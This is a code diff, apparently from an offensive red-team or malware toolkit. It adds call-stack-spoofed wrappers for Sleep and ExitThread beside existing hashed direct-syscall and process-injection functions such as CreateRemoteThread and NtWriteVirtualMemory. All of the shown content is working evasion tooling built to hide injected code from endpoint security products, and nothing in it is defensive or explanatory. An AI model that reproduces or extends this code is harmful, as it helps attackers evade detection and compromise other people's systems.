@@ -13,7 +13,9 @@ DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$CreateProcessA        ( LPCSTR, LPSTR,
 DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateRemoteThread    ( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
 DECLSPEC_IMPORT HANDLE    WINAPI KERNEL32$CreateThread          ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
 DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$DuplicateHandle       ( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
+DECLSPEC_IMPORT VOID      WINAPI KERNEL32$ExitThread            ( DWORD );
 DECLSPEC_IMPORT VOID      WINAPI KERNEL32$RtlCaptureContext     ( PCONTEXT );
+DECLSPEC_IMPORT VOID      WINAPI KERNEL32$Sleep                 ( DWORD );
 DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect        ( LPVOID, SIZE_T, DWORD, PDWORD );
 
 DECLSPEC_IMPORT HRESULT   WINAPI OLE32$CoCreateInstance         ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
@@ -432,4 +434,27 @@ BOOL WINAPI _WriteProcessMemory ( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID
     SYSCALL syscall = { 0 };
     if ( ! prepare_nt_syscall ( NTDLL_HASH, NTWRITEVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
     return ( NTSTATUS ) do_syscall ( hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, lpNumberOfBytesWritten ) == 0;
+}
+
+VOID WINAPI _Sleep ( DWORD dwMilliseconds )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
+    call.argc = 1;
+    call.args [ 0 ] = spoof_arg ( dwMilliseconds );
+
+    spoof_call ( &call );
+}
+
+VOID WINAPI _ExitThread ( DWORD dwExitCode )
+{
+    /* call the real exit thread */
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
+    call.argc = 1;
+    call.args [ 0 ]  = spoof_arg ( dwExitCode );
+
+    spoof_call ( &call );
 }
